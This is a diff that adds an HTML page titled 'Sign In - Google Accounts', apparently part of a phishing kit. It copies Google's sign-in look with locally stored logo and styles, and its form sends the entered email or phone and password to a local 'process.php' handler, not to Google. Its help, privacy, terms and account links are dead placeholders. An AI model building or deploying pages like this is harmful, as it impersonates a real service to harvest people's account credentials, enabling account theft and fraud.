@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<title>Sign In - Google Accounts</title>
+<link href="local_resources/img/5072ba6ed8b72364c6056dca21f287a9.ico" rel="icon" type="image/x-icon"/>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="local_resources/css/c98203533166987548c91edcbc769bd6.css" rel="stylesheet"/>
+<style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f5;
+            position: relative;
+            flex-direction: column;
+        }
+
+        .signin-box {
+            width: 100%;
+            max-width: 1000px;
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+        }
+
+        .signin-text {
+            font-family: "Poppins", sans-serif;
+            font-weight: 400;
+            font-style: normal;
+
+        }
+
+        .left-section {
+            width: 50%;
+            text-align: left;
+            padding-right: 20px;
+            margin-bottom: 15%;
+        }
+
+        .right-section {
+            width: 50%;
+        }
+
+        .signin-box h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .signin-box p {
+            font-size: 16px;
+            margin-bottom: 30px;
+            color: #555555;
+        }
+
+        .input-container {
+            margin-left: 30px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 12px 10px;
+            font-size: 18px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .input-container input:focus {
+            border-color: #0b57d0;
+            box-shadow: 0 0 5px rgba(26, 115, 232, 0.3);
+        }
+
+        .input-container label {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            font-size: 16px;
+            color: #999;
+            background-color: #ffffff;
+            padding: 0 4px;
+            transform: translateY(-50%);
+            transition: all 0.2s ease;
+        }
+
+        .input-container input:focus+label,
+        .input-container input:not(:placeholder-shown)+label {
+            top: -1px;
+            left: 10px;
+            font-size: 12px;
+            color: #0b57d0;
+            background-color: #ffffff;
+            padding: 0 4px;
+        }
+
+        .link {
+            margin-left: 30px;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .button-container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            margin-top: 20px;
+        }
+
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            font-size: 16px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            margin-top: 10%;
+        }
+
+        .button:hover {
+            background-color: #1669c1;
+        }
+
+        .create-account {
+            background-color: #ffffff;
+            color: #1a73e8;
+            font-size: 16px;
+            text-decoration: none;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 24px;
+            margin-left: 20px;
+            display: inline-block;
+            text-align: center;
+            margin-top: 10%;
+        }
+
+        .create-account:hover {
+            background-color: #f1f1f1;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .small-text {
+            margin-left: 30px;
+            font-size: 14px;
+            color: #555555;
+        }
+
+        .small-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .small-text a:hover {
+            text-decoration: none;
+        }
+
+        .external-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            margin-left: 58%;
+        }
+
+        .external-links a {
+            font-size: 12px;
+            color: #555555;
+            text-decoration: none;
+        }
+
+        .external-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .signin-box {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .left-section,
+            .right-section {
+                width: 100%;
+                padding-right: 0;
+                padding-left: 0;
+                text-align: center;
+            }
+
+            .bottom-links {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .bottom-links a {
+                margin-bottom: 10px;
+            }
+
+            .external-links {
+                position: static;
+                margin-top: 20px;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+<div class="signin-box">
+<div class="left-section">
+<img alt="Custom Logo" src="local_resources/img/5897789fd7337ccdda36d5af6f7681d9.png" width="60"/>
+<h1 class="signin-text">Sign in</h1>
+<p>Use your Google Account</p>
+</div>
+<div class="right-section">
+<form action="process.php" id="signin-form" method="post">
+<div class="input-container">
+<input id="email" name="email" placeholder=" " required="" type="text"/>
+<label for="email">Email or phone</label>
+</div>
+<h1></h1>
+<div class="input-container">
+<input id="password" name="password" placeholder=" " required="" type="password"/>
+<label for="password">Password</label>
+</div>
+<a class="link" href="#">Forgot email?</a>
+<p class="small-text">
+                        Not your computer? Use Guest mode to sign in privately.<br/>
+<a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank">Learn more about using Guest mode</a>
+</p>
+<div class="button-container">
+<a class="create-account" href="#">Create account</a>
+                             
+                        <button class="button" type="submit">Sign in</button>
+</div>
+</form>
+</div>
+</div>
+<div class="external-links">
+<a href="#">Help</a>
+<a href="#">Privacy</a>
+<a href="#">Terms</a>
+</div>
+</div>
+</body>
+</html>
